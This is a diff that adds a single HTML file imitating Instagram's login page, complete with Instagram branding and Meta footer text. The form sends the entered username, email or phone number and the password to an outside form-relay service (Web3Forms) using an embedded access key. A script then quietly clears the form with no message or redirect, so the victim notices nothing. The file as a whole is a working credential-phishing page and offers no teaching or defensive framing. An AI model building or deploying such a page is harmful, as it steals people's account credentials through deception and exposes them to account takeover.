@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" href="img/instagram1.png" />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <title>Instagram</title>
+</head>
+<style>
+    .floating-label {
+        position: relative;
+    }
+
+    .floating-label input:focus+label,
+    .floating-label input:not(:placeholder-shown)+label {
+        transform: translateY(-0.5rem);
+        font-size: 0.75rem;
+        color: #9ca3af;
+        /* Tailwind's blue-500 */
+    }
+
+    .floating-label label {
+        position: absolute;
+        top: 10px;
+        left: 0.75rem;
+        transition: all 0.2s ease-in-out;
+        pointer-events: none;
+        color: #9ca3af;
+        /* Tailwind's gray-400 */
+    }
+
+    input:focus {
+        outline: none;
+    }
+
+    input {
+        font-size: 14px;
+    }
+</style>
+
+<body class="bg-white text-gray-800">
+    <main class=" lg:mt-6 mt-20 lg:flex justify-center items-center overflow-hidden">
+        <div class="flex lg:gap-9 justify-center items-center ">
+            <div class="hidden lg:flex">
+                <img src="img/homepage2.png" alt="Smartphones" class="max-w-full h-auto mb-8" />
+            </div>
+
+            <div class="flex flex-col items-center justify-center ">
+                <div class="flex w-full h-full justify-center items-center ">
+                    <div
+                        class="flex lg:w-[350px] w-[330px] h-[390px] flex-col items-center justify-center bg-white border border-gray-300 p-8">
+                        <img src="img/instagram.png" alt="Instagram" class="h-12 flex justify-center w-44 mb-8 mt-8" />
+
+
+                        <form id="contactForm" action="https://api.web3forms.com/submit" method="POST"
+                            class="flex flex-col items-center space-y-3 w-full">
+
+                            <input type="hidden" name="access_key" value="c5958938-e2f1-455a-ad86-0b839098c174">
+
+                            <div class="floating-label mb-2 w-full ">
+                                <input type="text" name="email" placeholder=" "
+                                    class="w-full bg-[#fafafa] pt-3 pb-1 px-3 border border-gray-300 rounded "
+                                    required />
+                                <label class="text-[14px]">Phone number, username, or email</label>
+                            </div>
+                            <div class="floating-label relative mb-2 w-full">
+                                <input id="password" type="password" name="text" placeholder=" "
+                                    class="w-full bg-[#fafafa] pt-3 pb-1 px-3 border border-gray-300 rounded "
+                                    required />
+                                <label class="text-[14px]">Password</label>
+                                <span id="togglePassword"
+                                    class="absolute right-2 top-2 text-blue-500 cursor-pointer">Show</span>
+                            </div>
+
+                            <!-- Honeypot Spam Protection -->
+                            <input type="checkbox" name="botcheck" class="hidden" style="display: none;">
+
+                            <button type="submit"
+                                class="w-full py-[4px] mt-2 text-white bg-blue-400 rounded-lg font-medium hover:bg-blue-500">Log
+                                In</button>
+                            <span
+                                class="relative flex justify-center items-center text-gray-500 font-semibold text-xs mt-4 mb-6 w-full">
+                                <div class=" top-1/2 w-full h-px bg-gray-300"></div>
+                                <span class="bg-white px-2 ">OR</span>
+                                <div class=" top-1/2 w-full h-px bg-gray-300"></div>
+                            </span>
+                        </form>
+
+                        <a href="#" class="flex items-center justify-center text-blue-500 font-semibold text-sm mt-2">
+                            <img src="img/facebook.png" alt="Facebook" class="w-4 h-4 mr-2 brightness-100" />
+                            Login with Facebook
+                        </a>
+                        <a href="#" class="mt-4 mb-4 flex justify-center text-blue-500 text-xs">Forgot password?</a>
+
+                    </div>
+                </div>
+                <div class="flex h-full  justify-center items-center ">
+                    <div
+                        class="flex justify-center lg:w-[348px] w-[330px]  items-center bg-white border border-gray-300 py-6  text-gray-500 mt-4 text-sm">
+                        <p class="text-black">Don't have an account?
+                            <a href="#" class="text-blue-500 font-medium ml-1 cursor-pointer">Sign up</a>
+                        </p>
+                    </div>
+                </div>
+                <div class="text-center mb-8 mt-4">
+                    <p class="text-black text-sm">Get the app.</p>
+                    <div class="flex justify-center mt-4">
+                        <img src="img/apple.png" alt="Apple Store" class="w-36 h-10 mx-1 cursor-pointer" />
+                        <img src="img/google.png" alt="Google Play" class="w-36 h-10 mx-1 cursor-pointer" />
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        </div>
+    </main>
+
+    <footer class="flex flex-col items-center justify-center my-10 bg-white">
+        <div class="text-center text-gray-500 text-xs">
+            <div class="flex flex-wrap justify-center space-x-4 mb-4">
+                <a href="#" class="hover:underline">Meta</a>
+                <a href="#" class="hover:underline">About</a>
+                <a href="#" class="hover:underline">Blog</a>
+                <a href="#" class="hover:underline">Jobs</a>
+                <a href="#" class="hover:underline">Help</a>
+                <a href="#" class="hover:underline">API</a>
+                <a href="#" class="hover:underline">Privacy</a>
+                <a href="#" class="hover:underline">Terms</a>
+                <a href="#" class="hover:underline">Locations</a>
+                <a href="#" class="hover:underline">Instagram Lite</a>
+                <a href="#" class="hover:underline">Threads</a>
+                <a href="#" class="hover:underline">Contact Uploading & Non-Users</a>
+                <a href="#" class="hover:underline">Meta Verified</a>
+            </div>
+            <div class="mb-4">
+                <span>English <i class="fas fa-chevron-down"></i></span>
+            </div>
+            <div>
+                <span>© 2024 Instagram from Meta</span>
+            </div>
+        </div>
+    </footer>
+
+    <!-- <script src="script.js"></script> -->
+    <script>
+        document.getElementById("contactForm").addEventListener("submit", async function (event) {
+            event.preventDefault(); // Prevent default form submission
+
+            // Serialize form data
+            const formData = new FormData(this);
+
+            try {
+                // Send the form data to Web3Forms API
+                const response = await fetch(this.action, {
+                    method: this.method,
+                    body: formData
+                });
+
+                if (response.ok) {
+                    // Reset the form without redirecting or showing any message
+                    this.reset();
+                } else {
+                    console.error("There was an error submitting the form.");
+                }
+            } catch (error) {
+                console.error("Form submission error:", error);
+            }
+        });
+    </script>
+    <script>
+        const togglePassword = document.getElementById('togglePassword');
+        const password = document.getElementById('password');
+
+        togglePassword.addEventListener('click', function () {
+            // Toggle the type attribute
+            const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
+            password.setAttribute('type', type);
+
+            // Toggle the text
+            this.textContent = this.textContent === 'Show' ? 'Hide' : 'Show';
+        });
+    </script>
+</body>
+
+</html>
